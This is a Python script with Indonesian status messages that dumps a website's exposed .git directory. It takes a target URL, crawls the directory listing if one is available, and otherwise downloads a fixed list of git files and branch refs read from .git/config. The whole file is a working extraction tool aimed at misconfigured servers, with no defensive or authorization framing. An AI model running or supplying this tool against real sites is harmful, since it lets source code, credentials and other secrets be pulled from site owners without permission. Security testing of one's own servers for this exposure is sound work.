import os
import sys
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

def check_directory_listing(base_url):
    response = requests.get(urljoin(base_url, ".git/"))
    return response.status_code == 200 and "Index of" in response.text

def get_directory_listing(base_url, path=".git/"):
    print(f"Mendapatkan daftar direktori dari: {path}")
    response = requests.get(urljoin(base_url, path))
    file_list = []
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href in ('../', './') or '?' in href:
                continue  # Skip parent directory references and sorting links
            full_path = urljoin(path + '/', href).replace("\\", "/")
            if full_path.startswith(".git/"):
                if href.endswith('/'):
                    file_list.extend(get_directory_listing(base_url, full_path))
                else:
                    file_list.append(full_path)
    return file_list

def check_git_config(base_url):
    config_url = urljoin(base_url, ".git/config")
    response = requests.get(config_url)
    if response.status_code == 200:
        return response.text
    else:
        print(f"File {config_url} tidak bisa diakses.")
        sys.exit(1)

def download_file(base_url, file_path, save_dir):
    file_url = urljoin(base_url, file_path)
    local_path = os.path.join(save_dir, file_path).replace("\\", "/")
    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    
    response = requests.get(file_url, stream=True)
    if response.status_code == 200:
        with open(local_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=1024):
                file.write(chunk)
        print(f"Berhasil diunduh: {file_path}")
    else:
        print(f"Gagal mengunduh: {file_path}")

def download_git_folder(base_url, save_dir):
    file_list = get_directory_listing(base_url)
    
    if not file_list:
        file_list = [
            ".git/config", ".git/description", ".git/FETCH_HEAD", ".git/HEAD", ".git/index", ".git/packed-refs",
            ".git/info/exclude", ".git/logs/HEAD", ".git/refs/remotes/origin/HEAD"
        ]
        hooks = ["applypatch-msg.sample", "commit-msg.sample", "pre-commit.sample"]
        file_list.extend([f".git/hooks/{hook}" for hook in hooks])
        
        config_content = check_git_config(base_url)
        branches = []
        for line in config_content.splitlines():
            if line.strip().startswith("merge = refs/heads/"):
                branch = line.strip().split("/")[-1]
                branches.append(branch)
        
        for branch in branches:
            file_list.append(f".git/logs/refs/heads/{branch}")
            file_list.append(f".git/refs/heads/{branch}")
    
    for file in file_list:
        print(f"Mengunduh file: {file}")
        download_file(base_url, file, save_dir)

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Usage: python script.py <target_url> [save_directory]")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/') + '/'
    save_directory = sys.argv[2] if len(sys.argv) == 3 else os.getcwd()
    
    if check_directory_listing(target_url):
        print("Directory listing aktif, mengunduh seluruh isi .git/")
        download_git_folder(target_url, save_directory)
    else:
        print("Directory listing tidak aktif, mencoba mengunduh file secara manual.")
        download_git_folder(target_url, save_directory)

if __name__ == "__main__":
    main()
